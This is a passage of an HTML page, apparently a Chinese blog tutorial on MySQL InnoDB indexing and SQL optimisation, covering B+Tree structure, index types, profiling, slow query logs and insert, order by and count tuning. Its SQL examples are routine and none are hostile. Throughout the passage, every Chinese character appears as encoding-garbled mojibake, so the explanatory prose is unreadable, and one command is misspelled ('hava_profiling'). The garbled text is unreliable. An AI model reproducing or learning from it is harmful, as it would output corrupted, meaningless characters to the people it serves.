å¼•</p></li></ul><blockquote><p>ä¸ºä»€ä¹ˆInnDBé€‰æ‹©B+Treeä½œä¸ºç´¢å¼•ç»“æ„</p><ul><li>ç›¸æ¯”è¾ƒäºŒå‰æ ‘ï¼Œå…¶å±‚çº§æ›´å°‘ï¼Œæœç´¢æ•ˆç‡æ›´é«˜</li><li>äºB-treeï¼Œæ— è®ºæ˜¯å¶å­èŠ‚ç‚¹è¿˜æ˜¯éå¶å­èŠ‚ç‚¹ï¼Œéƒ½ä¼šä¿å­˜æ•°æ®ï¼Œè¿™æ ·å¯¼è‡´ä¸€é¡µä¸­å­˜å‚¨çš„é”®å€¼å‡å°‘ï¼ŒæŒ‡é’ˆè·Ÿç€å‡å°‘ï¼Œè¦åŒæ ·ä¿å­˜å¤§é‡æ•°æ®ï¼Œåªèƒ½å¢åŠ æ ‘çš„é«˜åº¦ï¼Œå¯¼è‡´æ€§èƒ½é™ä½ï¼›</li><li>ç›¸å¯¹Hashç´¢å¼•ï¼ŒB+treeæ”¯æŒèŒƒå›´åŒ¹é…åŠæ’åºæ“ä½œ</li></ul></blockquote><h2 id="ç´¢å¼•åˆ†ç±»"><a href="#ç´¢å¼•åˆ†ç±»" class="headerlink" title="ç´¢å¼•åˆ†ç±»"></a>ç´¢å¼•åˆ†ç±»</h2><p>åœ¨MySQLæ•°æ®åº“ï¼Œå°†ç´¢å¼•çš„å…·ä½“ç±»å‹ä¸»è¦åˆ†ä¸ºä»¥ä¸‹å‡ ç±»ï¼šä¸»é”®ç´¢å¼•ã€å”¯ä¸€ç´¢å¼•ã€å¸¸è§„ç´¢å¼•ã€å…¨æ–‡ç´¢å¼•ã€‚</p><table><thead><tr><th>åˆ†ç±»</th><th>å«ä¹‰</th><th>ç‰¹ç‚¹</th><th>å…³é”®å­—</th></tr></thead><tbody><tr><td>ä¸»é”®ç´¢å¼•</td><td>é’ˆå¯¹è¡¨ä¸­ä¸»é”®åˆ›å»ºçš„ç´¢å¼•</td><td>é»˜è®¤è‡ªåŠ¨åˆ›å»ºï¼Œåªèƒ½æœ‰ä¸€ä¸ª</td><td>primary</td></tr><tr><td>å”¯ä¸€ç´¢å¼•</td><td>é¿å…è¡¨ä¸­æŸ æ•°æ®åˆ—çš„å€¼é‡å¤</td><td>å¯ä»¥æœ‰å¤šä¸ª</td><td>UNIQUE</td></tr><tr><td>å¸¸è§„ç´¢å¼•</td><td>å¿«é€Ÿå®šä½æ•°æ®</td><td>å¯ä»¥æœ‰å¤šä¸ª</td><td></td></tr><tr><td>å…¨æ–‡ç´¢å¼•</td><td>å…¨æ–‡ç´¢å¼•æŸ¥æ‰¾çš„æ˜¯æ–‡ä¸­çš„å…³é”®å­—ï¼Œè€Œä¸æ˜¯æ¯”è¾ƒç´¢å¼•çš„å€¼</td><td>å¯ä»¥æœ‰å¤šä¸ª</td><td>FULLTEXT</td></tr></tbody></table><h3 id="èšé›†ç´¢å¼•å’ŒäºŒçº§ç´¢å¼•"><a href="#èšé›†ç´¢å¼•å’ŒäºŒçº§ç´¢å¼•" class="headerlink" title="èšé›†ç´¢å¼•å’ŒäºŒçº§ç´¢å¼•"></a>èšé›†ç´¢å¼•å’ŒäºŒçº§ç´¢å¼•</h3><p>InnDBå­˜å‚¨å¼•æ“ä¸­ï¼Œæ ¹æ®ç´¢å¼•çš„å­˜å‚¨å½¢å¼ï¼Œåˆå¯ä»¥åˆ†ä¸ºä»¥ä¸‹ä¸¤ç§ï¼š</p><table><thead><tr><th>åˆ†ç±»</th><th>å«ä¹‰</th><th>ç‰¹ç‚¹</th></tr></thead><tbody><tr><td>èšé›†ç´¢å¼•(Clustered Index)</td><td>å°†æ•°æ®å­˜å‚¨ä¸ç´¢å¼•æ”¾åˆ°ä¸€å—ï¼Œç´¢å¼•ç»“æ„çš„å¶å­èŠ‚ç‚¹ä¿å­˜åˆ°è¡Œæ•°æ®</td><td>å¿…é¡»æœ‰ä¸”åªæœ‰ä¸€ä¸ª</td></tr><tr><td>äºŒçº§ç´¢å¼•</td><td>å°†æ•°æ®ä¸ç´¢å¼•åˆ†å¼€å­˜å‚¨ï¼Œç´¢å¼•ç»“æ„çš„å¶å­èŠ‚ç‚¹å…³è”æ˜¯å¯¹åº”çš„ä¸»é”®</td><td>å¯ä»¥ å­˜æ”¾å¾ˆå¤šä¸ª</td></tr></tbody></table><p>èšé›†ç´¢å¼•é€‰å–è§„åˆ™ï¼š</p><ul><li>å¦‚æœå­˜åœ¨ä¸»é”®ï¼Œä¸»é”®ç´¢å¼•å°±æ˜¯èšé›†ç´¢å¼•</li><li>å¦‚æœä¸å­˜åœ¨ä¸»é”®ï¼Œå°†ä½¿ç”¨ç¬¬ä¸€ä¸ªå”¯ä¸€(UNIQUE)ç´¢å¼•ä½œä¸ºèšé›†ç´¢å¼•</li><li>å¦‚æœè¡¨æ²¡æœ‰ä¸»é”®ï¼Œæˆ–æ²¡æœ‰åˆé€‚çš„å”¯ä¸€ç´¢å¼•ï¼Œåˆ™InnoDBä¼šè‡ªåŠ¨ç”Ÿæˆä¸€ä¸ªrowidä½œä¸ºéšè—çš„èšé›†ç´¢å¼•ã€‚</li></ul><p>èšé›†ç´¢å¼•ä¸äºŒçº§ç´¢å¼•çš„ç»“æ„å¦‚ä¸‹ï¼š</p><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220923121417420.png" alt="image-20220923121417420"></p><p>å½“æ‰§è¡Œ</p><pre><code class="hljs mysql">select * from user where name &#x3D; &#39;Arm&#39;;</code></pre><p>é€šè¿‡äºŒçº§ç´¢å¼•è·å–åˆ°å…¶å¯¹åº”çš„ä¸»é”®ç´¢å¼•ï¼Œå†åˆ°èšé›†ç´¢å¼•ä¸­è·å–æ‰€æœ‰çš„è¡Œæ•°æ®ï¼Œè¿™ç§æŸ¥è¯¢è¿‡ç¨‹å«åšå›è¡¨æŸ¥è¯¢ã€‚</p><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220923121626216.png" alt="image-20220923121626216"></p><p>ä¸Šè¿°æŸ¥è¯¢è¯¦ç»†æŸ¥è¯¢è¿‡ç¨‹å¦‚ä¸‹ï¼š</p><ul><li><p>ç”±äºæ˜¯æ ¹æ®nameå­—æ®µè¿›è¡ŒæŸ¥è¯¢ï¼Œæ‰€ä»¥å…ˆæ ¹æ®name=â€™Armâ€™åˆ°nameå­—æ®µçš„äºŒçº§ç´¢å¼•ä¸­è¿›è¡ŒåŒ¹é…æŸ¥æ‰¾ã€‚ä½†æ˜¯åœ¨äºŒçº§ç´¢å¼•ä¸­åªèƒ½æŸ¥æ‰¾åˆ° Arm å¯¹åº”çš„ä¸»é”®å€¼ 10ã€‚</p></li><li><p>ç”±äºæŸ¥è¯¢çš„å­—æ®µæ˜¯*ï¼ŒäºŒçº§ç´¢å¼•ä¸­æ²¡æœ‰è¯¥å­—æ®µï¼Œæ‰€ä»¥æ­¤æ—¶éœ€è¦æ ¹æ®äºŒçº§ç´¢å¼•ä¸­å­˜å‚¨çš„ä¸»é”®id = 10å»èšé›†ç´¢å¼•ä¸­æŸ¥è¯¢</p></li><li><p>æœ€åè·å–ä¸»é”®ä¸º10çš„è¡Œï¼Œè¿”å›æ‰€æœ‰æ•°æ®</p></li></ul><p>InnoDBå­˜å‚¨å¼•æ“æœ€å°çš„å­˜å‚¨å•å…ƒ-é¡µ(16K)ï¼Œé‚£ä¹ˆé«˜åº¦ä¸º2çš„B+treeæ ‘èƒ½å­˜å‚¨å¤šå°‘æ¡æ•°æ®ï¼Ÿ</p><blockquote><p>è¿™é‡Œæˆ‘ä»¬<code>å…ˆå‡è®¾B+æ ‘é«˜ä¸º2</code>ï¼Œå³å­˜åœ¨ä¸€ä¸ªæ ¹èŠ‚ç‚¹å’Œè‹¥å¹²ä¸ªå¶å­èŠ‚ç‚¹ï¼Œé‚£ä¹ˆè¿™æ£µB+æ ‘çš„å­˜æ”¾æ€»è®°å½•æ•°ä¸ºï¼šæ ¹èŠ‚ç‚¹æŒ‡é’ˆæ•°*å•ä¸ªå¶å­èŠ‚ç‚¹è®°å½•è¡Œæ•°ã€‚</p><p>ä¸Šæ–‡æˆ‘ä»¬å·²ç»è¯´æ˜å•ä¸ªå¶å­èŠ‚ç‚¹ï¼ˆé¡µï¼‰ä¸­çš„è®°å½•æ•°=16K/1K=16ã€‚ï¼ˆè¿™é‡Œå‡è®¾ä¸€è¡Œè®°å½•çš„æ•°æ®å¤§å°ä¸º1kï¼Œ<code>å®é™…ä¸Š</code>ç°åœ¨å¾ˆå¤šäº’è”ç½‘ä¸šåŠ¡<code>æ•°æ®è®°å½•å¤§å°é€šå¸¸å°±æ˜¯1Kå·¦å³</code>ï¼‰ã€‚</p><p>é‚£ä¹ˆç°åœ¨æˆ‘ä»¬éœ€è¦è®¡ç®—å‡º<code>éå¶å­èŠ‚ç‚¹èƒ½å­˜æ”¾å¤šå°‘æŒ‡é’ˆ</code>ï¼Œå…¶å®è¿™ä¹Ÿå¾ˆå¥½ç®—ï¼Œæˆ‘ä»¬å‡è®¾<code>ä¸»é”®IDä¸ºbigintç±»å‹ï¼Œé•¿åº¦ä¸º8å­—èŠ‚</code>ï¼Œè€Œ<code>æŒ‡é’ˆå¤§å°</code>åœ¨InnoDBæºç ä¸­è®¾ç½®ä¸º<code>6å­—èŠ‚</code>ï¼Œè¿™æ ·ä¸€å…±14å­—èŠ‚ï¼Œæˆ‘ä»¬ä¸€ä¸ªé¡µä¸­èƒ½å­˜æ”¾å¤šå°‘è¿™æ ·çš„å•å…ƒï¼Œå…¶å®å°±ä»£è¡¨æœ‰å¤šå°‘æŒ‡é’ˆï¼Œå³<code>16384/14=1170</code>ã€‚é‚£ä¹ˆå¯ä»¥ç®—å‡ºä¸€æ£µ<code>é«˜åº¦ä¸º2çš„B+æ ‘</code>ï¼Œèƒ½å­˜æ”¾<code>1170*16=18720æ¡</code>è¿™æ ·çš„æ•°æ®è®°å½•ã€‚</p><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220923124545908.png" alt="image-20220923124545908"></p></blockquote><h3 id="ç´¢å¼•è¯­æ³•"><a href="#ç´¢å¼•è¯­æ³•" class="headerlink" title="ç´¢å¼•è¯­æ³•"></a>ç´¢å¼•è¯­æ³•</h3><p>1) åˆ›å»ºç´¢å¼•</p>   <pre><code class="hljs mysql">CREATE [ UNIQUE | FULLTEXT ] INDEX index_name ON table_name ( index_col_name,... );</code></pre><p>2) æŸ¥çœ‹ç´¢å¼•</p>   <pre><code class="hljs mysql">show INDEX in account;</code></pre><p>3) åˆ é™¤ç´¢å¼•</p>   <pre><code class="hljs mysql">DROP INDEX index_name ON table_name ;</code></pre><p>ç´¢å¼•çš„ä½¿ç”¨</p><ul><li><p>nameå­—æ®µä¸ºå§“åå­—æ®µï¼Œè¯¥å­—æ®µçš„å€¼å¯èƒ½ä¼šé‡å¤ï¼Œä¸ºè¯¥å­—æ®µåˆ›å»ºç´¢å¼•</p><pre><code class="hljs mysql">CREATE INDEX idx_user_name ON tb_user(name);</code></pre></li><li><p>phoneæ‰‹æœºå·å­—æ®µçš„å€¼ï¼Œæ˜¯éç©ºï¼Œä¸”å”¯ä¸€çš„ï¼Œä¸ºè¯¥å­—æ®µåˆ›å»ºå”¯ä¸€ç´¢å¼•ã€‚</p><pre><code class="hljs mysql">CREATE UNIQUE INDEX  idx_user_phone ON tb_user(phone);</code></pre></li><li><p>ä¸ºprofessionã€ageã€statusåˆ›å»ºè”åˆç´¢å¼•ã€‚</p><pre><code class="hljs mysql">CREATE INDEX idx_user_profession_age_status ON tb_user(profession, age, status);</code></pre></li><li><p>ä¸ºemailå»ºç«‹åˆé€‚çš„ç´¢å¼•æ¥æå‡æŸ¥è¯¢æ•ˆç‡</p><pre><code class="hljs mysql">CREATE INDEX idx_user_email ON tb_user(email);</code></pre></li></ul><p>æŸ¥çœ‹è¡¨ä¸­å·²åˆ›å»ºçš„ç´¢å¼•</p><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220923130559040.png" alt="image-20220923130559040"></p><h2 id="SQLæ€§èƒ½åˆ†æ"><a href="#SQLæ€§èƒ½åˆ†æ" class="headerlink" title="SQLæ€§èƒ½åˆ†æ"></a>SQLæ€§èƒ½åˆ†æ</h2><h3 id="SQLçš„æ‰§è¡Œé¢‘æ¬¡"><a href="#SQLçš„æ‰§è¡Œé¢‘æ¬¡" class="headerlink" title="SQLçš„æ‰§è¡Œé¢‘æ¬¡"></a>SQLçš„æ‰§è¡Œé¢‘æ¬¡</h3><pre><code class="hljs mysql">SHOW GLOBAL  STATUS LIKE &#39;Com_____&#39;;SHOW SESSION  STATUS LIKE &#39;Com_____&#39;;</code></pre><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220923131257200.png" alt="image-20220923131257200"></p><h3 id="æ…¢æŸ¥è¯¢æ—¥å¿—"><a href="#æ…¢æŸ¥è¯¢æ—¥å¿—" class="headerlink" title="æ…¢æŸ¥è¯¢æ—¥å¿—"></a>æ…¢æŸ¥è¯¢æ—¥å¿—</h3><p>æ…¢æŸ¥è¯¢æ—¥å¿—è®°å½•äº†æ‰€æœ‰æ‰§è¡Œæ—¶é—´è¶…è¿‡æŒ‡å®šå‚æ•°ï¼ˆlong_query_timeï¼Œå•ä½ï¼šç§’ï¼Œé»˜è®¤10ç§’ï¼‰çš„æ‰€æœ‰SQLè¯­å¥çš„æ—¥å¿—ã€‚</p><p>MySQLçš„æ…¢æŸ¥è¯¢æ—¥å¿—é»˜è®¤æ²¡æœ‰å¼€å¯ï¼Œæˆ‘ä»¬å¯ä»¥æŸ¥çœ‹ä¸€ä¸‹ç³»ç»Ÿå˜é‡ slow_query_logã€‚</p><p>å¼€å¯<code>slow_query_log</code>(é»˜è®¤å…³é—­)ï¼Œåœ¨mysqlé…ç½®æ–‡ä»¶ä¸­æ·»åŠ ä»¥ä¸‹é…ç½®</p><pre><code class="hljs ini"><span class="hljs-attr">slow_query_log</span> = <span class="hljs-number">1</span> <span class="hljs-attr">long_query_time</span>= <span class="hljs-number">2</span> <span class="hljs-comment"># å½“æŸ¥è¯¢æ—¶é—´è¶…è¿‡ä¸¤ç§’æ—¶ï¼Œä¼šè¢«è®°å½•</span></code></pre><h3 id="profileè¯¦æƒ…"><a href="#profileè¯¦æƒ…" class="headerlink" title="profileè¯¦æƒ…"></a>profileè¯¦æƒ…</h3><p>show profiles èƒ½å¤Ÿåœ¨åšSQLä¼˜åŒ–æ—¶å¸®åŠ©æˆ‘ä»¬äº†è§£æ—¶é—´éƒ½è€—è´¹åˆ°å“ªé‡Œå»äº†ã€‚é€šè¿‡have_profilingå‚æ•°ï¼Œèƒ½å¤Ÿçœ‹åˆ°å½“å‰MySQLæ˜¯å¦æ”¯æŒprofileæ“ä½œï¼š</p><pre><code class="hljs mysql">SHOW @@hava_profiling;</code></pre><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220923132917533.png" alt="image-20220923132917533"></p><p>å¦‚æœæ²¡æœ‰å¼€å¯ï¼Œåˆ™å¯ä»¥ä½¿ç”¨ä»¥ä¸‹è¯­å¥å¼€å¯</p><pre><code class="hljs mysql">set profiling  &#x3D; 1</code></pre><p>æ‰§è¡Œä¸€ç³»åˆ—çš„ä¸šåŠ¡SQLçš„æ“ä½œï¼Œç„¶åé€šè¿‡å¦‚ä¸‹æŒ‡ä»¤æŸ¥çœ‹æŒ‡ä»¤çš„æ‰§è¡Œè€—æ—¶ï¼š</p><pre><code class="hljs mysql">-- æŸ¥çœ‹æ¯ä¸€æ¡SQLçš„è€—æ—¶åŸºæœ¬æƒ…å†µ show profiles; -- æŸ¥çœ‹æŒ‡å®šquery_idçš„SQLè¯­å¥å„ä¸ªé˜¶æ®µçš„è€—æ—¶æƒ…å†µ show profile for query query_id; -- æŸ¥çœ‹æŒ‡å®šquery_idçš„SQLè¯­å¥CPUçš„ä½¿ç”¨æƒ…å†µ show profile cpu for query query_id;</code></pre><h3 id="æœ€å·¦å‰ç¼€æ³•åˆ™"><a href="#æœ€å·¦å‰ç¼€æ³•åˆ™" class="headerlink" title="æœ€å·¦å‰ç¼€æ³•åˆ™"></a>æœ€å·¦å‰ç¼€æ³•åˆ™</h3><p>å¦‚æœç´¢å¼•äº†å¤šåˆ—ï¼ˆè”åˆç´¢å¼•ï¼‰ï¼Œè¦éµå®ˆæœ€å·¦å‰ç¼€æ³•åˆ™ã€‚æœ€å·¦å‰ç¼€æ³•åˆ™æŒ‡çš„æ˜¯æŸ¥è¯¢ä»ç´¢å¼•çš„æœ€å·¦åˆ—å¼€å§‹ï¼Œå¹¶ä¸”ä¸è·³è¿‡ç´¢å¼•ä¸­çš„åˆ—ã€‚å¦‚æœè·³è·ƒæŸä¸€åˆ—ï¼Œç´¢å¼•å°†ä¼šéƒ¨åˆ†å¤±æ•ˆ(åé¢çš„å­—æ®µç´¢å¼•å¤±æ•ˆ)ã€‚</p><h3 id="è¦†ç›–ç´¢å¼•"><a href="#è¦†ç›–ç´¢å¼•" class="headerlink" title="è¦†ç›–ç´¢å¼•"></a>è¦†ç›–ç´¢å¼•</h3><p>å°½é‡ä½¿ç”¨è¦†ç›–ç´¢å¼•ï¼Œå‡å°‘select *ã€‚ é‚£ä¹ˆä»€ä¹ˆæ˜¯è¦†ç›–ç´¢å¼•å‘¢ï¼Ÿ è¦†ç›–ç´¢å¼•æ˜¯æŒ‡ æŸ¥è¯¢ä½¿ç”¨äº†ç´¢å¼•ï¼Œå¹¶ä¸”éœ€è¦è¿”å›çš„åˆ—ï¼Œåœ¨è¯¥ç´¢å¼•ä¸­å·²ç»å…¨éƒ¨èƒ½å¤Ÿæ‰¾åˆ° ã€‚</p><p>ä½¿ç”¨è¦†ç›–ç´¢å¼•å¯ä»¥é¿å…å›è¡¨æŸ¥è¯¢ï¼Œæé«˜sqlæŸ¥è¯¢çš„æ•ˆç‡ã€‚</p><h3 id="ç´¢å¼•è®¾è®¡åŸåˆ™"><a href="#ç´¢å¼•è®¾è®¡åŸåˆ™" class="headerlink" title="ç´¢å¼•è®¾è®¡åŸåˆ™"></a>ç´¢å¼•è®¾è®¡åŸåˆ™</h3><blockquote><p>1). é’ˆå¯¹äºæ•°æ®é‡è¾ƒå¤§ï¼Œä¸”æŸ¥è¯¢æ¯”è¾ƒé¢‘ç¹çš„è¡¨å»ºç«‹ç´¢å¼•ã€‚</p><p>2). é’ˆå¯¹äºå¸¸ä½œä¸ºæŸ¥è¯¢æ¡ä»¶ï¼ˆwhereï¼‰ã€æ’åºï¼ˆorder byï¼‰ã€åˆ†ç»„ï¼ˆgroup     byï¼‰æ“ä½œçš„å­—æ®µå»ºç«‹ç´¢å¼•ã€‚</p><p>3). å°½é‡é€‰æ‹©åŒºåˆ†åº¦é«˜çš„åˆ—ä½œä¸ºç´¢å¼•ï¼Œå°½é‡å»ºç«‹å”¯ä¸€ç´¢å¼•ï¼ŒåŒºåˆ†åº¦è¶Šé«˜ï¼Œä½¿ç”¨ç´¢å¼•çš„æ•ˆç‡è¶Šé«˜ã€‚</p><p>4). å¦‚æœæ˜¯å­—ç¬¦ä¸²ç±»å‹çš„å­—æ®µï¼Œå­—æ®µçš„é•¿åº¦è¾ƒé•¿ï¼Œå¯ä»¥é’ˆå¯¹äºå­—æ®µçš„ç‰¹ç‚¹ï¼Œå»ºç«‹å‰ç¼€ç´¢å¼•ã€‚</p><p>5). å°½é‡ä½¿ç”¨è”åˆç´¢å¼•ï¼Œå‡å°‘å•åˆ—ç´¢å¼•ï¼ŒæŸ¥è¯¢æ—¶ï¼Œè”åˆç´¢å¼•å¾ˆå¤šæ—¶å€™å¯ä»¥è¦†ç›–ç´¢å¼•ï¼ŒèŠ‚çœå­˜å‚¨ç©ºé—´ï¼Œé¿å…å›è¡¨ï¼Œæé«˜æŸ¥è¯¢æ•ˆç‡ã€‚</p><p>6). è¦æ§åˆ¶ç´¢å¼•çš„æ•°é‡ï¼Œç´¢å¼•å¹¶ä¸æ˜¯å¤šå¤šç›Šå–„ï¼Œç´¢å¼•è¶Šå¤šï¼Œç»´æŠ¤ç´¢å¼•ç»“æ„çš„ä»£ä»·ä¹Ÿå°±è¶Šå¤§ï¼Œä¼šå½±å“å¢åˆ æ”¹çš„æ•ˆç‡ã€‚</p><p>create unique index idx_user_phone_name on tb_user(phone,name); </p><p>7). å¦‚æœç´¢å¼•åˆ—ä¸èƒ½å­˜å‚¨NULLå€¼ï¼Œè¯·åœ¨åˆ›å»ºè¡¨æ—¶ä½¿ç”¨NOT NULLçº¦æŸå®ƒã€‚å½“ä¼˜åŒ–å™¨çŸ¥é“æ¯åˆ—æ˜¯å¦åŒ…å«NULLå€¼æ—¶ï¼Œå®ƒå¯ä»¥æ›´å¥½åœ°ç¡®å®šå“ªä¸ªç´¢å¼•æœ€æœ‰æ•ˆåœ°ç”¨äºæŸ¥è¯¢ã€‚</p></blockquote><h2 id="SQLä¼˜åŒ–"><a href="#SQLä¼˜åŒ–" class="headerlink" title="SQLä¼˜åŒ–"></a>SQLä¼˜åŒ–</h2><h3 id="æ’å…¥æ•°æ®"><a href="#æ’å…¥æ•°æ®" class="headerlink" title="æ’å…¥æ•°æ®"></a>æ’å…¥æ•°æ®</h3><p>å¦‚æœæˆ‘ä»¬éœ€è¦ä¸€æ¬¡æ€§å¾€æ•°æ®åº“è¡¨ä¸­æ’å…¥å¤šæ¡è®°å½•ï¼Œå¯ä»¥ä»ä»¥ä¸‹ä¸‰ä¸ªæ–¹é¢è¿›è¡Œä¼˜åŒ–ã€‚</p><ul><li><p>1). ä¼˜åŒ–æ–¹æ¡ˆä¸€</p><pre><code>æ‰¹é‡æ’å…¥æ•°æ®</code></pre></li><li><p>2). ä¼˜åŒ–æ–¹æ¡ˆäºŒ</p><pre><code>æ‰‹åŠ¨æ§åˆ¶äº‹åŠ¡</code></pre></li><li><p>3). ä¼˜åŒ–æ–¹æ¡ˆä¸‰</p><p>ä¸»é”®é¡ºåºæ’å…¥ï¼Œæ€§èƒ½è¦é«˜äºä¹±åºæ’å…¥</p><p>å¦‚æœä¸€æ¬¡æ€§éœ€è¦æ’å…¥å¤§æ‰¹é‡æ•°æ®(æ¯”å¦‚: å‡ ç™¾ä¸‡çš„è®°å½•)ï¼Œä½¿ç”¨insertè¯­å¥æ’å…¥æ€§èƒ½è¾ƒä½ï¼Œæ­¤æ—¶å¯ä»¥ä½¿</p><p>ç”¨MySQLæ•°æ®åº“æä¾›çš„loadæŒ‡ä»¤è¿›è¡Œæ’å…¥ã€‚</p><pre><code class="hljs mysql">-- å®¢æˆ·ç«¯è¿æ¥æœåŠ¡ç«¯æ—¶ï¼ŒåŠ ä¸Šå‚æ•° -â€“local-infile mysql â€“-local-infile -u root -p -- è®¾ç½®å…¨å±€å‚æ•°local_infileä¸º1ï¼Œå¼€å¯ä»æœ¬åœ°åŠ è½½æ–‡ä»¶å¯¼å…¥æ•°æ®çš„å¼€å…³ set global local_infile &#x3D; 1; -- æ‰§è¡ŒloadæŒ‡ä»¤å°†å‡†å¤‡å¥½çš„æ•°æ®ï¼ŒåŠ è½½åˆ°è¡¨ç»“æ„ä¸­ load data local infile &#39;&#x2F;root&#x2F;sql1.log&#39; into table tb_user fields terminated by &#39;,&#39; lines terminated by &#39;\n&#39; ;</code></pre></li><li><p>4).ä¸»é”®é¡ºåºæ’å…¥ï¼Œæ€§èƒ½è¦é«˜äºä¹±åºæ’å…¥</p></li></ul><h3 id="ä¸»é”®ä¼˜åŒ–"><a href="#ä¸»é”®ä¼˜åŒ–" class="headerlink" title="ä¸»é”®ä¼˜åŒ–"></a>ä¸»é”®ä¼˜åŒ–</h3><ul><li>æ»¡è¶³ä¸šåŠ¡éœ€æ±‚çš„æƒ…å†µä¸‹ï¼Œå°½é‡é™ä½ä¸»é”®çš„é•¿åº¦ã€‚</li><li>æ’å…¥æ•°æ®æ—¶ï¼Œå°½é‡é€‰æ‹©é¡ºåºæ’å…¥ï¼Œé€‰æ‹©ä½¿ç”¨AUTO_INCREMENTè‡ªå¢ä¸»é”®ã€‚</li><li>å°½é‡ä¸è¦ä½¿ç”¨UUIDåšä¸»é”®æˆ–è€…æ˜¯å…¶ä»–è‡ªç„¶ä¸»é”®ï¼Œå¦‚èº«ä»½è¯å·ã€‚</li><li>ä¸šåŠ¡æ“ä½œæ—¶ï¼Œé¿å…å¯¹ä¸»é”®çš„ä¿®æ”¹ã€‚</li></ul><h3 id="order-byä¼˜åŒ–"><a href="#order-byä¼˜åŒ–" class="headerlink" title="order byä¼˜åŒ–"></a>order byä¼˜åŒ–</h3><p>MySQLçš„æ’åºï¼Œæœ‰ä¸¤ç§æ–¹å¼ï¼š</p><ul><li><p>Using filesort : é€šè¿‡è¡¨çš„ç´¢å¼•æˆ–å…¨è¡¨æ‰«æï¼Œè¯»å–æ»¡è¶³æ¡ä»¶çš„æ•°æ®è¡Œï¼Œç„¶ååœ¨æ’åºç¼“å†²åŒºsortbufferä¸­å®Œæˆæ’åºæ“ä½œï¼Œæ‰€æœ‰ä¸æ˜¯é€šè¿‡ç´¢å¼•ç›´æ¥è¿”å›æ’åºç»“æœçš„æ’åºéƒ½å« FileSort æ’åºã€‚</p></li><li><p>Using index : é€šè¿‡æœ‰åºç´¢å¼•é¡ºåºæ‰«æç›´æ¥è¿”å›æœ‰åºæ•°æ®ï¼Œè¿™ç§æƒ…å†µå³ä¸º using indexï¼Œä¸éœ€è¦é¢å¤–æ’åºï¼Œæ“ä½œæ•ˆç‡é«˜ã€‚</p></li></ul><p>å¯¹äºä»¥ä¸Šçš„ä¸¤ç§æ’åºæ–¹å¼ï¼ŒUsing indexçš„æ€§èƒ½é«˜ï¼Œè€ŒUsing filesortçš„æ€§èƒ½ä½ï¼Œæˆ‘ä»¬åœ¨ä¼˜åŒ–æ’åºæ“ä½œæ—¶ï¼Œå°½é‡è¦ä¼˜åŒ–ä¸º Using indexã€‚</p><p>order byä¼˜åŒ–åŸåˆ™:</p><ul><li>A. æ ¹æ®æ’åºå­—æ®µå»ºç«‹åˆé€‚çš„ç´¢å¼•ï¼Œå¤šå­—æ®µæ’åºæ—¶ï¼Œä¹Ÿéµå¾ªæœ€å·¦å‰ç¼€æ³•åˆ™ã€‚</li><li>B. å°½é‡ä½¿ç”¨è¦†ç›–ç´¢å¼•ã€‚</li><li>C. å¤šå­—æ®µæ’åº, ä¸€ä¸ªå‡åºä¸€ä¸ªé™åºï¼Œæ­¤æ—¶éœ€è¦æ³¨æ„è”åˆç´¢å¼•åœ¨åˆ›å»ºæ—¶çš„è§„åˆ™ï¼ˆASC/DESCï¼‰ã€‚</li><li>D. å¦‚æœä¸å¯é¿å…çš„å‡ºç°filesortï¼Œå¤§æ•°æ®é‡æ’åºæ—¶ï¼Œå¯ä»¥é€‚å½“å¢å¤§æ’åºç¼“å†²åŒºå¤§å°</li><li>sort_buffer_size(é»˜è®¤256k)ã€‚ </li></ul><h3 id="group-byä¼˜åŒ–"><a href="#group-byä¼˜åŒ–" class="headerlink" title="group byä¼˜åŒ–"></a>group byä¼˜åŒ–</h3><p>åœ¨åˆ†ç»„æ“ä½œä¸­ï¼Œæˆ‘ä»¬éœ€è¦é€šè¿‡ä»¥ä¸‹ä¸¤ç‚¹è¿›è¡Œä¼˜åŒ–ï¼Œä»¥æå‡æ€§èƒ½ï¼š</p><ul><li><p>A. åœ¨åˆ†ç»„æ“ä½œæ—¶ï¼Œå¯ä»¥é€šè¿‡ç´¢å¼•æ¥æé«˜æ•ˆç‡ã€‚</p></li><li><p>B. åˆ†ç»„æ“ä½œæ—¶ï¼Œç´¢å¼•çš„ä½¿ç”¨ä¹Ÿæ˜¯æ»¡è¶³æœ€å·¦å‰ç¼€æ³•åˆ™çš„ã€‚</p></li></ul><h3 id="limitä¼˜åŒ–"><a href="#limitä¼˜åŒ–" class="headerlink" title="limitä¼˜åŒ–"></a>limitä¼˜åŒ–</h3><p>ä¼˜åŒ–æ€è·¯: ä¸€èˆ¬åˆ†é¡µæŸ¥è¯¢æ—¶ï¼Œé€šè¿‡åˆ›å»º è¦†ç›–ç´¢å¼• èƒ½å¤Ÿæ¯”è¾ƒå¥½åœ°æé«˜æ€§èƒ½ï¼Œå¯ä»¥é€šè¿‡è¦†ç›–ç´¢å¼•åŠ å­æŸ¥è¯¢å½¢å¼è¿›è¡Œä¼˜åŒ–ã€‚</p><h3 id="countä¼˜åŒ–"><a href="#countä¼˜åŒ–" class="headerlink" title="countä¼˜åŒ–"></a>countä¼˜åŒ–</h3><p><strong>countçš„å·¥ä½œåŸç†</strong></p><blockquote><p>MyISAM å¼•æ“æŠŠä¸€ä¸ªè¡¨çš„æ€»è¡Œæ•°å­˜åœ¨äº†ç£ç›˜ä¸Šï¼Œå› æ­¤æ‰§è¡Œ count(*) çš„æ—¶å€™ä¼šç›´æ¥è¿”å›è¿™ä¸ªæ•°ï¼Œæ•ˆç‡å¾ˆé«˜ï¼› ä½†æ˜¯å¦‚æœæ˜¯å¸¦æ¡ä»¶çš„countï¼ŒMyISAMä¹Ÿæ…¢ã€‚</p><p>InnoDB å¼•æ“å°±éº»çƒ¦äº†ï¼Œå®ƒæ‰§è¡Œ count(*) çš„æ—¶å€™ï¼Œéœ€è¦æŠŠæ•°æ®ä¸€è¡Œä¸€è¡Œåœ°ä»å¼•æ“é‡Œé¢è¯»å‡ºæ¥ï¼Œç„¶åç´¯ç§¯è®¡æ•°ã€‚</p></blockquote><p><strong>countçš„ç”¨æ³•</strong></p><p>count() 